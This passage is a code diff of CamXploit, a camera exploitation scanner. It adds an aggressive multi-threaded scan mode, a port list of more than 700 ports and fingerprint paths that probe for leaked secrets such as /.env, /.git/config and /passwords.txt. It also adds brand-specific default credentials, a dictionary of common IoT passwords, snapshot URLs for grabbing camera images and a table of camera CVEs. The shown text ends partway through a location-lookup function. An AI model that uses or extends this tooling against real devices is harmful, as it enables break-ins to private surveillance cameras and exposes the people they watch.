@@ -1,1658 +1,1743 @@
-import requests
+import sys
+import io
+
+class AndroidOutput(io.TextIOBase):
+    def __init__(self, callback):
+        self.callback = callback
+        self.buffer_text = ""
+
+    def write(self, text):
+        if isinstance(text, str):
+            self.buffer_text += text
+            if '\n' in self.buffer_text:
+                lines = self.buffer_text.split('\n')
+                for line in lines[:-1]:
+                    self.callback(line + '\n')
+                self.buffer_text = lines[-1]
+        return len(text) if text else 0
+
+    def flush(self):
+        if self.buffer_text:
+            self.callback(self.buffer_text)
+            self.buffer_text = ""
+
+try:
+    import requests
+    from requests.packages.urllib3.exceptions import InsecureRequestWarning
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+    print("[!] Warning: 'requests' library not found. Falling back to urllib.")
+
+import urllib.request
+import urllib.error
+import ssl
+
+def make_request(url, auth=None, timeout=5, verify=False, method='GET', headers=None):
+    """Universal request wrapper with fallback to urllib if requests is missing."""
+    if headers is None: headers = {}
+
+    if REQUESTS_AVAILABLE:
+        try:
+            import requests
+            if auth and isinstance(auth, tuple):
+                return requests.request(method, url, auth=auth, timeout=timeout, verify=verify, headers=headers)
+            return requests.request(method, url, timeout=timeout, verify=verify, headers=headers)
+        except Exception as e:
+            if not isinstance(e, requests.exceptions.RequestException):
+                pass # Fallback to urllib for non-request errors
+            else:
+                raise e
+
+    # Urllib fallback
+    context = ssl._create_unverified_context() if not verify else None
+
+    if auth and isinstance(auth, tuple):
+        import base64
+        auth_str = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
+        headers['Authorization'] = f'Basic {auth_str}'
+
+    req = urllib.request.Request(url, method=method, headers=headers)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=context) as response:
+            class MockResponse:
+                def __init__(self, res):
+                    self.status_code = res.getcode()
+                    self.text = res.read().decode('utf-8', errors='ignore')
+                    self.content = self.text.encode('utf-8')
+                    self.headers = dict(res.info())
+                    self.url = res.geturl()
+            return MockResponse(response)
+    except urllib.error.HTTPError as e:
+        class MockErrorResponse:
+            def __init__(self, err):
+                self.status_code = err.code
+                self.text = ""
+                self.headers = {}
+                self.url = url
+        return MockErrorResponse(e)
+    except Exception as e:
+        raise e
+
 import socket
 import sys
 import threading
 import warnings
-from xml.etree import ElementTree as ET
 import ipaddress
 import base64
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 import time
+import os
+os.environ['PYTHONIOENCODING'] = 'utf-8'
+
+# === STORM BREAKER MODE ===
+FORCE_MAX_MODE = True  # Set to True for maximum scanning
+
+if FORCE_MAX_MODE:
+    MAX_THREADS = 40
+    TIMEOUT = 8
+    print("⚡ STORM BREAKER MODE ACTIVATED - Maximum Aggression")
+
+try:
+    from onvif import ONVIFCamera
+except ImportError:
+    try:
+        from onvif2 import ONVIFCamera
+    except ImportError:
+        try:
+            from onvif.client import ONVIFCamera
+        except ImportError:
+            ONVIFCamera = None
+            print("[!] Warning: ONVIF library not found or incompatible.")
+
+try:
+    from zeep.exceptions import Fault
+except ImportError:
+    Fault = Exception
+import uuid
+import ssl
+from datetime import datetime
+try:
+    import shodan
+except ImportError:
+    shodan = None
+from concurrent.futures import ThreadPoolExecutor
 
 # Suppress SSL warnings
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-if sys.stdout.isatty():
-    R = '\033[31m'  # Red
-    G = '\033[32m'  # Green
-    C = '\033[36m'  # Cyan
-    W = '\033[0m'   # Reset
-    Y = '\033[33m'  # Yellow
-    M = '\033[35m'  # Magenta
-    B = '\033[34m'  # Blue
-else:
-    R = G = C = W = Y = M = B = ''  # No color in non-TTY environments
+import sys
+IS_ANDROID = hasattr(sys, 'getandroidapilevel') \
+    or 'com.chaquo' in sys.modules.get(
+        '__loader__', '').__class__.__module__ \
+    if hasattr(sys.modules.get('__loader__', ''),
+        '__class__') else False
 
-BANNER = rf"""
-{R}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⣸⣏⠛⠻⠿⣿⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⣿⣿⣿⣷⣦⣤⣈⠙⠛⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⣈⠙⠻⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀
-⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡉⠛⠻⢿⣿⣷⣶⣤⣀⠀⠀
-⠀⠀⠀⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⢻⣍⡉⠉⣿⠇⠀
-⠀⠀⠀⠀⠀⠀⠀⢹⡏⢹⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣰⣿⣿⣾⠏⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠘⣿⠈⣿⠸⣯⠉⠛⠿⢿⣿⣿⣿⣿⡏⠀⠻⠿⣿⠇⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⢻⡄⣿⡀⠀⠀⠀⠈⠙⠛⠿⠿⠿⠿⠛⠋⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⣇⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣀⣀⣿⣴⣿⢾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⣴⡶⠾⠟⠛⠋⢹⡏⠀⢹⡇⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢠⣿⠀⠀⠀⠀⢀⣈⣿⣶⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⢸⣿⣴⠶⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+# Scapy is restricted on Android (requires root for raw sockets)
+try:
+    from scapy.all import ARP, Ether, srp
+    SCAPY_AVAILABLE = True
+except (ImportError, Exception):
+    SCAPY_AVAILABLE = False
 
-  {G}[💀] CamXploit - Camera Exploitation & Exposure Scanner
-  {C}[🔍] Discover open CCTV cameras & security flaws
-  {Y}[⚠️] For educational & security research purposes only!{W}
+# Symbols/Emojis from the screenshots
+SCAN = "🔍"
+OPEN = "✅"
+INFO = "ℹ️"
+ALRT = "⚠️"
+CAM  = "📷"
+STRM = "🎥"
+DONE = "🏁"
+ERR  = "❌"
+PLD  = "📊"
+KEY  = "🔑"
+LOCK = "🔓"
+GLOB = "🌐"
+TV   = "📺"
+FIRE = "🔥"
+SHLD = "🛡️"
+RADR = "📡"
 
-  {B}VERSION{W}  = 2.0.2
-  {B}Made By{W}  = Spyboy
-  {B}Twitter{W}  = https://spyboy.in/twitter
-  {B}Discord{W}  = https://spyboy.in/Discord
-  {B}Github{W}   = https://github.com/spyboy-productions/CamXploit
-"""
+# Comprehensive Port List (728+ tactical ports)
+PORTS_LIST = (
+    list(range(1, 201)) +             # Basic & Web (200)
+    list(range(1024, 1101)) +         # Common Camera High Ports (77)
+    list(range(5000, 5051)) +         # Synology/UPnP/Misc (51)
+    list(range(8000, 8201)) +         # Hikvision/HTTP-Alt Large Range (201)
+    list(range(8440, 8451)) +         # HTTPS Alts (11)
+    list(range(8550, 8561)) +         # RTSP Alts (11)
+    list(range(8880, 8891)) +         # Misc Alts (11)
+    list(range(9000, 9151)) +         # Sony/Bosch/Generic Range (151)
+    list(range(37770, 37786)) +       # Dahua Specific (16)
+    [1935, 3702, 34567, 10554]        # Standard CCTV (4)
+)
+COMMON_PORTS = sorted(list(set(PORTS_LIST)))
 
-# Common ports used by IP cameras and CCTV devices
-COMMON_PORTS = [
-    # Standard web ports
-    80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
-    8090, 8091, 8092, 8093, 8094, 8095, 8096, 8097, 8098, 8099,
-    
-    # RTSP ports
-    554, 8554, 10554, 1554, 2554, 3554, 4554, 5554, 6554, 7554, 9554,
-    
-    # RTMP ports
-    1935, 1936, 1937, 1938, 1939,
-    
-    # Custom camera ports
-    37777, 37778, 37779, 37780, 37781, 37782, 37783, 37784, 37785, 37786, 37787, 37788, 37789, 37790,
-    37791, 37792, 37793, 37794, 37795, 37796, 37797, 37798, 37799, 37800,
-    
-    # ONVIF ports
-    3702, 3703, 3704, 3705, 3706, 3707, 3708, 3709, 3710,
-    
-    # VLC streaming ports
-    8100, 8110, 8120, 8130, 8140, 8150, 8160, 8170, 8180, 8190,
-    
-    # Common alternative ports
-    21, 22, 23, 25, 53, 110, 143, 993, 995,  # FTP, SSH, Telnet, SMTP, DNS, POP3, IMAP, IMAPS, POP3S
-    1024, 1025, 1026, 1027, 1028, 1029, 1030,  # Common alternative ports
-    2000, 2001, 2002, 2003, 2004, 2005,  # Common alternative ports
-    3000, 3001, 3002, 3003, 3004, 3005,  # Common alternative ports
-    4000, 4001, 4002, 4003, 4004, 4005,  # Common alternative ports
-    5000, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010,
-    6000, 6001, 6002, 6003, 6004, 6005, 6006, 6007, 6008, 6009, 6010,
-    7000, 7001, 7002, 7003, 7004, 7005, 7006, 7007, 7008, 7009, 7010,
-    9000, 9001, 9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009, 9010,
-    
-    # Additional common ports
-    8888, 8889, 8890, 8891, 8892, 8893, 8894, 8895, 8896, 8897, 8898, 8899,
-    9999, 9998, 9997, 9996, 9995, 9994, 9993, 9992, 9991, 9990,
-    
-    # MMS ports
-    1755, 1756, 1757, 1758, 1759, 1760,
-    
-    # Custom ranges
-    10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009, 10010,
-    11000, 11001, 11002, 11003, 11004, 11005, 11006, 11007, 11008, 11009, 11010,
-    12000, 12001, 12002, 12003, 12004, 12005, 12006, 12007, 12008, 12009, 12010,
-    13000, 13001, 13002, 13003, 13004, 13005, 13006, 13007, 13008, 13009, 13010,
-    14000, 14001, 14002, 14003, 14004, 14005, 14006, 14007, 14008, 14009, 14010,
-    15000, 15001, 15002, 15003, 15004, 15005, 15006, 15007, 15008, 15009, 15010,
-    
-    # High ports commonly used by cameras
-    20000, 20001, 20002, 20003, 20004, 20005, 20006, 20007, 20008, 20009, 20010,
-    21000, 21001, 21002, 21003, 21004, 21005, 21006, 21007, 21008, 21009, 21010,
-    22000, 22001, 22002, 22003, 22004, 22005, 22006, 22007, 22008, 22009, 22010,
-    23000, 23001, 23002, 23003, 23004, 23005, 23006, 23007, 23008, 23009, 23010,
-    24000, 24001, 24002, 24003, 24004, 24005, 24006, 24007, 24008, 24009, 24010,
-    25000, 25001, 25002, 25003, 25004, 25005, 25006, 25007, 25008, 25009, 25010,
-    
-    # Additional custom ranges
-    30000, 30001, 30002, 30003, 30004, 30005, 30006, 30007, 30008, 30009, 30010,
-    31000, 31001, 31002, 31003, 31004, 31005, 31006, 31007, 31008, 31009, 31010,
-    32000, 32001, 32002, 32003, 32004, 32005, 32006, 32007, 32008, 32009, 32010,
-    33000, 33001, 33002, 33003, 33004, 33005, 33006, 33007, 33008, 33009, 33010,
-    34000, 34001, 34002, 34003, 34004, 34005, 34006, 34007, 34008, 34009, 34010,
-    35000, 35001, 35002, 35003, 35004, 35005, 35006, 35007, 35008, 35009, 35010,
-    36000, 36001, 36002, 36003, 36004, 36005, 36006, 36007, 36008, 36009, 36010,
-    37000, 37001, 37002, 37003, 37004, 37005, 37006, 37007, 37008, 37009, 37010,
-    38000, 38001, 38002, 38003, 38004, 38005, 38006, 38007, 38008, 38009, 38010,
-    39000, 39001, 39002, 39003, 39004, 39005, 39006, 39007, 39008, 39009, 39010,
-    40000, 40001, 40002, 40003, 40004, 40005, 40006, 40007, 40008, 40009, 40010,
-    41000, 41001, 41002, 41003, 41004, 41005, 41006, 41007, 41008, 41009, 41010,
-    42000, 42001, 42002, 42003, 42004, 42005, 42006, 42007, 42008, 42009, 42010,
-    43000, 43001, 43002, 43003, 43004, 43005, 43006, 43007, 43008, 43009, 43010,
-    44000, 44001, 44002, 44003, 44004, 44005, 44006, 44007, 44008, 44009, 44010,
-    45000, 45001, 45002, 45003, 45004, 45005, 45006, 45007, 45008, 45009, 45010,
-    46000, 46001, 46002, 46003, 46004, 46005, 46006, 46007, 46008, 46009, 46010,
-    47000, 47001, 47002, 47003, 47004, 47005, 47006, 47007, 47008, 47009, 47010,
-    48000, 48001, 48002, 48003, 48004, 48005, 48006, 48007, 48008, 48009, 48010,
-    49000, 49001, 49002, 49003, 49004, 49005, 49006, 49007, 49008, 49009, 49010,
-    50000, 50001, 50002, 50003, 50004, 50005, 50006, 50007, 50008, 50009, 50010,
-    51000, 51001, 51002, 51003, 51004, 51005, 51006, 51007, 51008, 51009, 51010,
-    52000, 52001, 52002, 52003, 52004, 52005, 52006, 52007, 52008, 52009, 52010,
-    53000, 53001, 53002, 53003, 53004, 53005, 53006, 53007, 53008, 53009, 53010,
-    54000, 54001, 54002, 54003, 54004, 54005, 54006, 54007, 54008, 54009, 54010,
-    55000, 55001, 55002, 55003, 55004, 55005, 55006, 55007, 55008, 55009, 55010,
-    56000, 56001, 56002, 56003, 56004, 56005, 56006, 56007, 56008, 56009, 56010,
-    57000, 57001, 57002, 57003, 57004, 57005, 57006, 57007, 57008, 57009, 57010,
-    58000, 58001, 58002, 58003, 58004, 58005, 58006, 58007, 58008, 58009, 58010,
-    59000, 59001, 59002, 59003, 59004, 59005, 59006, 59007, 59008, 59009, 59010,
-    60000, 60001, 60002, 60003, 60004, 60005, 60006, 60007, 60008, 60009, 60010,
-    61000, 61001, 61002, 61003, 61004, 61005, 61006, 61007, 61008, 61009, 61010,
-    62000, 62001, 62002, 62003, 62004, 62005, 62006, 62007, 62008, 62009, 62010,
-    63000, 63001, 63002, 63003, 63004, 63005, 63006, 63007, 63008, 63009, 63010,
-    64000, 64001, 64002, 64003, 64004, 64005, 64006, 64007, 64008, 64009, 64010,
-    65000, 65001, 65002, 65003, 65004, 65005, 65006, 65007, 65008, 65009, 65010
-]
-
-# Remove duplicates while preserving order
-COMMON_PORTS = list(dict.fromkeys(COMMON_PORTS))
-
-# Best‑effort mapping of common CCTV / streaming ports to service names
 PORT_SERVICE_MAP = {
-    # Web interfaces
-    80:  ("HTTP", "Web Interface"),
-    81:  ("HTTP-Alt", "Web Interface"),
-    82:  ("HTTP-Alt", "Web Interface"),
-    83:  ("HTTP-Alt", "Web Interface"),
-    84:  ("HTTP-Alt", "Web Interface"),
-    85:  ("HTTP-Alt", "Web Interface"),
-    86:  ("HTTP-Alt", "Web Interface"),
-    87:  ("HTTP-Alt", "Web Interface"),
-    88:  ("HTTP-Alt", "Web Interface"),
-    89:  ("HTTP-Alt", "Web Interface"),
-    443: ("HTTPS", "Secure Web Interface"),
-    8080: ("HTTP-Alt", "Web Interface"),
-    8443: ("HTTPS-Alt", "Secure Web Interface"),
-    8000: ("HTTP-Alt", "Web Interface / Hikvision"),
-    8001: ("HTTP-Alt", "Web Interface"),
-    8888: ("HTTP-Alt", "Web Interface"),
-    9000: ("HTTP-Alt", "Web Interface"),
-
-    # RTSP / RTMP streaming
-    554: ("RTSP", "Real-Time Streaming Protocol"),
-    8554: ("RTSP-Alt", "Real-Time Streaming Protocol"),
-    10554: ("RTSP-Alt", "Real-Time Streaming Protocol"),
-    1935: ("RTMP", "Real-Time Messaging Protocol (Streaming)"),
-
-    # ONVIF / discovery
-    3702: ("ONVIF", "Device Discovery / Control"),
-
-    # Vendor‑specific / DVR ports
-    37777: ("Dahua", "DVR/NVR Service"),
-    37778: ("Dahua", "DVR/NVR Service"),
-    8008:  ("Hikvision", "Web / API"),
-
-    # MMS / legacy streaming
-    1755: ("MMS", "Microsoft Media Server"),
+    21: "FTP", 22: "SSH", 23: "Telnet", 80: "HTTP (Web Interface)",
+    81: "HTTP-Alt", 82: "HTTP-Alt", 88: "HTTP-Alt", 443: "HTTPS (Secure Web Interface)",
+    554: "RTSP (Streaming)", 1883: "MQTT (Cloud Connectivity)", 1935: "RTMP", 3702: "ONVIF Discovery",
+    34567: "XMEye Default", 37777: "Dahua Service", 5000: "UPnP / Synology",
+    8000: "Hikvision / HTTP-Alt", 8080: "HTTP-Alt (Web Interface)", 8883: "MQTTS (Secure Cloud)",
+    8443: "HTTPS-Alt / Cloud", 8554: "RTSP-Alt", 9000: "HTTP-Alt / Sony / Cloud"
 }
 
-# Common admin login pages or interesting paths for cameras
-COMMON_PATHS = [
-    "/", "/admin", "/login", "/viewer", "/webadmin", "/video", "/stream", "/live", "/snapshot", "/onvif-http/snapshot",
-    "/system.ini", "/config", "/setup", "/cgi-bin/", "/api/", "/camera", "/img/main.cgi"
+# Expanded Fingerprint Database for many camera types
+FINGERPRINT_PATHS = [
+    "/System/configurationFile", "/ISAPI/System/deviceInfo",            # Hikvision
+    "/cgi-bin/magicBox.cgi?action=getSystemInfo",                      # Dahua
+    "/axis-cgi/admin/param.cgi?action=list",                           # Axis
+    "/sony/info", "/media/video1",                                     # Sony
+    "/nphControlCamera?Resolution=640x480",                            # Panasonic
+    "/cgi-bin/admin/getparam.cgi",                                     # Vivotek
+    "/control/faststream.jpg?stream=full",                             # Mobotix
+    "/api.cgi?cmd=GetAbility", "/api.cgi?cmd=GetDevInfo",              # Reolink
+    "/get_params.cgi", "/get_status.cgi",                              # Foscam
+    "/deviceinfo", "/System/deviceInfo", "/conf", "/admin/device.php", # Generic
+    "/onvif/device_service", "/onvif/Media", "/onvif/PTZ",             # ONVIF specific
+    "/etc/config/image_config", "/etc/config/network_config",          # Potential backups
+    "/proc/kmsg", "/var/log/messages", "/tmp/log",                     # Potential leaks
+    "/shell?ls", "/cgi-bin/config.sh", "/cgi-bin/main.cgi",            # Debug/Shell
+    "/system.ini?loginuse&loginpas",                                   # CamOver / GoAhead
+    "/.env", "/.git/config", "/.svn/entries", "/.htaccess",            # Web Leaks
+    "/phpinfo.php", "/info.php", "/status", "/config.xml",             # Server Info
+    "/users.xml", "/accounts.xml", "/passwords.txt",                   # Cred leaks
+    "/view/viewer_index.shtml", "/live/index.html",                    # Specific Index pages
+    "/cgi-bin/get_camera_params.cgi", "/cgi-bin/get_status.cgi"         # More CCTV paths
 ]
 
-# Default credentials commonly used in IP cameras / DVR / NVR
-# This is intentionally broad and contains combinations seen across
-# Hikvision, Dahua, Axis, CP Plus, Uniview, generic OEM DVRs, etc.
-DEFAULT_CREDENTIALS = {
-    # Very common admin-style accounts
-    "admin": [
-        "admin", "1234", "12345", "123456", "1234567", "12345678", "123456789",
-        "admin123", "admin1234", "admin12345",
-        "password", "pass", "123", "1111", "0000", "8888",
-        "default", "admin@123", "Admin123", "Admin1234",
-        "888888", "666666",  # Common on many DVRs (Hikvision, Dahua, OEM)
-        "4321", "9999"
-    ],
-
-    # Root-style accounts (Linux‑based firmwares, some NVRs)
-    "root": [
-        "root", "toor", "1234", "12345", "123456",
-        "pass", "password", "root123", "admin", "1111", "0000"
-    ],
-
-    # Generic user accounts
-    "user": [
-        "user", "user123", "password", "1234", "12345", "123456"
-    ],
-    "guest": [
-        "guest", "guest123", "1234", "12345", "123456"
-    ],
-    "operator": [
-        "operator", "operator123", "1234", "12345"
-    ],
-
-    # Additional usernames seen on various CCTV brands / OEM NVRs
-    "administrator": [
-        "administrator", "admin", "1234", "12345", "123456", "password"
-    ],
-    "supervisor": [
-        "supervisor", "1234", "12345", "123456", "password"
-    ],
-    "support": [
-        "support", "support123", "1234", "password"
-    ],
-    "system": [
-        "system", "system123", "1234", "12345", "123456"
-    ],
-    "viewer": [
-        "viewer", "viewer123", "1234", "12345"
-    ],
-    "admin1": [
-        "admin", "admin1", "1234", "12345", "123456", "password"
-    ],
-    # Some devices expose numeric "admin"‑like users
-    "888888": [
-        "888888", "123456", "000000"
-    ],
-    "666666": [
-        "666666", "123456", "000000"
-    ],
+# Expanded Port Service Map
+PORT_SERVICE_MAP = {
+    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP (Web Interface)",
+    81: "HTTP-Alt", 82: "HTTP-Alt", 88: "HTTP-Alt", 110: "POP3", 143: "IMAP", 443: "HTTPS (Secure)",
+    554: "RTSP (Streaming)", 1883: "MQTT (Cloud)", 1935: "RTMP", 3306: "MySQL", 3389: "RDP",
+    3702: "ONVIF Discovery", 5000: "UPnP / Synology", 5555: "ADB (Android Debug)",
+    8000: "Hikvision / HTTP-Alt", 8080: "HTTP-Alt", 8081: "HTTP-Alt", 8443: "HTTPS-Alt",
+    8883: "MQTTS", 8554: "RTSP-Alt", 9000: "Sony / Bosch", 34567: "XMEye Default",
+    37777: "Dahua Service", 37778: "Dahua Config", 10554: "RTSP-Alt"
 }
 
-# New constants
-HTTPS_PORTS = [443, 8443, 8444]
-HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
+# Expanded Brand-specific prioritized credentials (100+)
+BRAND_CREDENTIALS = {
+    "Hikvision": [("admin", "12345"), ("admin", "abc12345"), ("admin", "admin12345"), ("admin", "12345678a"), ("admin", "hik12345"), ("admin", "Hik12345")],
+    "Dahua": [("admin", "admin"), ("admin", "888888"), ("admin", "admin123"), ("666666", "666666"), ("admin", "password"), ("admin", "123456")],
+    "Axis": [("root", "pass"), ("root", "root"), ("root", "axis"), ("admin", "admin"), ("root", "password")],
+    "Sony": [("admin", "admin"), ("admin", ""), ("root", "root"), ("admin", "12345")],
+    "Panasonic": [("admin", "12345"), ("admin", "password"), ("admin", "admin123")],
+    "Foscam": [("admin", ""), ("admin", "admin"), ("admin", "123456")],
+    "Reolink": [("admin", ""), ("admin", "admin")],
+    "TP-Link": [("admin", "admin"), ("admin", "password"), ("admin", "12345")],
+    "Wisenet": [("admin", "4321"), ("admin", "1234567")],
+    "Vivotek": [("root", ""), ("root", "root"), ("admin", "admin")]
 }
-TIMEOUT = 5
-PORT_SCAN_TIMEOUT = 1.5
 
-# Enhanced CVE database
+# Light Dictionary Mode (Top 50 common IoT/Camera passwords)
+IOT_COMMON_PASSWORDS = [
+    "admin", "12345", "123456", "password", "1234", "root", "admin123", "12345678",
+    "guest", "user", "pass", "1111", "0000", "666666", "888888", "9999", "qwerty",
+    "default", "support", "service", "camera", "operator", "supervisor", "system",
+    "123456789", "123123", "admin1234", "admin888", "admin777", "admin666",
+    "hik12345", "dahua123", "adminadmin", "rootroot", "meinsm", "ubnt", "microtik",
+    "admin@123", "12345678a", "admin1", "12345a", "security", "master", "public",
+    "private", "cisco", "login", "webcam", "video", "monitor"
+]
+
+DEFAULT_CREDENTIALS = [
+    ("", ""), ("admin", ""), ("admin", "admin"), ("admin", "12345"),
+    ("admin", "123456"), ("admin", "1234"), ("root", "root"), ("root", "toor"),
+    ("admin", "password"), ("support", "support"), ("user", "user"), ("admin", "admin123"),
+    ("admin", "12345678"), ("admin", "888888"), ("admin", "666666"), ("root", "password"),
+    ("admin", "admin1234"), ("guest", "guest"), ("operator", "operator"), ("service", "service"),
+    ("admin", "1111"), ("admin", "0000"), ("admin", "9999"), ("admin", "123123"),
+    ("root", "pass"), ("admin", "pass"), ("admin", "admin888"), ("admin", "admin777"),
+    ("admin", "smcadmin"), ("admin", "meinsm"), ("ubnt", "ubnt"), ("admin", "camera")
+]
+
+# Expanded CVE Database (Professional-Grade)
 CVE_DATABASE = {
-    "hikvision": [
-        "CVE-2021-36260", "CVE-2017-7921", "CVE-2021-31955", "CVE-2021-31956",
-        "CVE-2021-31957", "CVE-2021-31958", "CVE-2021-31959", "CVE-2021-31960",
-        "CVE-2021-31961", "CVE-2021-31962", "CVE-2021-31963", "CVE-2021-31964"
+    "Axis": [
+        ("CVE-2018-10660", "CRITICAL: Shell command injection in axis-cgi/param.cgi. Allows unauthenticated RCE."),
+        ("CVE-2020-29550", "HIGH: Heap-based buffer overflow in the ONVIF service. Can lead to service crash or RCE."),
+        ("CVE-2023-21406", "HIGH: Multiple vulnerabilities in AXIS OS allowing escalation of privileges."),
+        ("CVE-2021-31986", "HIGH: Command injection in various AXIS products via firmware upgrade.")
     ],
-    "dahua": [
-        "CVE-2021-33044", "CVE-2022-30563", "CVE-2021-33045", "CVE-2021-33046",
-        "CVE-2021-33047", "CVE-2021-33048", "CVE-2021-33049", "CVE-2021-33050",
-        "CVE-2021-33051", "CVE-2021-33052", "CVE-2021-33053", "CVE-2021-33054"
+    "Hikvision": [
+        ("CVE-2017-7921", "CRITICAL: Unauthenticated bypass to view snapshots/configs. Allows full system access."),
+        ("CVE-2021-36260", "CRITICAL: Command injection via web interface. Most prevalent Hikvision RCE."),
+        ("CVE-2013-4977", "HIGH: RTSP overflow allowing remote code execution."),
+        ("CVE-2023-28808", "MEDIUM: Improper authentication in some products allowing session hijacking."),
+        ("CVE-2014-4880", "HIGH: Information disclosure via config file download."),
+        ("CVE-2021-36260", "CRITICAL: Command injection vulnerability in the web server of some Hikvision IP cameras.")
     ],
-    "axis": [
-        "CVE-2018-10660", "CVE-2020-29550", "CVE-2020-29551", "CVE-2020-29552",
-        "CVE-2020-29553", "CVE-2020-29554", "CVE-2020-29555", "CVE-2020-29556",
-        "CVE-2020-29557", "CVE-2020-29558", "CVE-2020-29559", "CVE-2020-29560"
+    "Dahua": [
+        ("CVE-2021-33044", "CRITICAL: Authentication Bypass during identity verification. Allows admin access without password."),
+        ("CVE-2021-33045", "CRITICAL: Authentication Bypass during identity verification (Companion to 33044)."),
+        ("CVE-2013-6117", "CRITICAL: Backdoor in older firmware. Cleartext credentials leaked on port 37777."),
+        ("CVE-2022-30563", "HIGH: ONVIF implementation authentication bypass. Replay attack possible."),
+        ("CVE-2017-3193", "HIGH: Buffer overflow in web management interface."),
+        ("CVE-2020-25167", "MEDIUM: Weak password hashing allowing easy brute force.")
     ],
-    "cp plus": [
-        # Note: CP Plus CVEs - check for latest vulnerabilities
-        # Common issues: default credentials, unpatched firmware
+    "Sony": [
+        ("CVE-2018-13271", "CRITICAL: Remote Code Execution in some IP cameras via CGI binary."),
+        ("CVE-2019-15886", "HIGH: Authentication bypass allowing unauthorized settings modification."),
+        ("CVE-2016-10368", "MEDIUM: Cross-site scripting (XSS) in management console.")
+    ],
+    "Bosch": [
+        ("CVE-2021-23847", "HIGH: Memory corruption in web server leading to DoS or RCE."),
+        ("CVE-2021-23848", "MEDIUM: Information disclosure through debug logs.")
+    ],
+    "Reolink": [
+        ("CVE-2020-25169", "HIGH: Cleartext storage of sensitive information in memory."),
+        ("CVE-2022-26301", "HIGH: Command injection via unauthenticated API call."),
+        ("CVE-2023-46132", "CRITICAL: Multiple unauthenticated vulnerabilities in Reolink App/Client.")
+    ],
+    "Foscam": [
+        ("CVE-2017-17020", "CRITICAL: Hardcoded root password in various models."),
+        ("CVE-2018-19077", "HIGH: Command injection in web management interface.")
     ]
 }
 
-# Thread control
-threads_running = True
+# Snapshot paths for common brands
+SNAPSHOT_PATHS = [
+    "/onvif-http/snapshot?Profile_1", "/ISAPI/Streaming/channels/1/picture", # Hikvision
+    "/cgi-bin/snapshot.cgi", "/cgi-bin/magicBox.cgi?action=getSnapshot",     # Dahua
+    "/axis-cgi/jpg/image.cgi", "/axis-cgi/mjpg/video.cgi",                   # Axis
+    "/snapshot.jpg", "/snap.jpg", "/image.jpg", "/tmpfs/auto.jpg",          # Generic
+    "/cgi-bin/viewer/video.jpg", "/cgi-bin/net_image.cgi",                  # Vivotek/Panasonic
+    "/api/camera/snapshot", "/api/video/snapshot"                           # Modern/API
+]
 
-def print_search_urls(ip):
-    print(f"\n[🌍] {C}Use these URLs to check the camera exposure manually:{W}")
-    print(f"  🔹 Shodan: https://www.shodan.io/search?query={ip}")
-    print(f"  🔹 Censys: https://search.censys.io/hosts/{ip}")
-    print(f"  🔹 Zoomeye: https://www.zoomeye.org/searchResult?q={ip}")
-    print(f"  🔹 Google Dorking (Quick Search): https://www.google.com/search?q=site:{ip}+inurl:view/view.shtml+OR+inurl:admin.html+OR+inurl:login")
-
-def google_dork_search(ip):
-    print(f"\n[🔎] {C}Google Dorking Suggestions:{W}")
-    queries = [
-        f"site:{ip} inurl:view/view.shtml",
-        f"site:{ip} inurl:admin.html",
-        f"site:{ip} inurl:login",
-        f"intitle:'webcam' inurl:{ip}",
-    ]
-    for q in queries:
-        print(f"  🔍 Google Dork: https://www.google.com/search?q={q.replace(' ', '+')}")
-
-def get_ip_location_info(ip):
-    """Get comprehensive IP and location information"""
-    print(f"\n{C}[🌍] IP and Location Information:{W}")
-    try:
-        response = requests.get(f"https://ipinfo.io/{ip}/json")
-        if response.status_code == 200:
-            data = response.json()
-            
-            # Basic IP Information
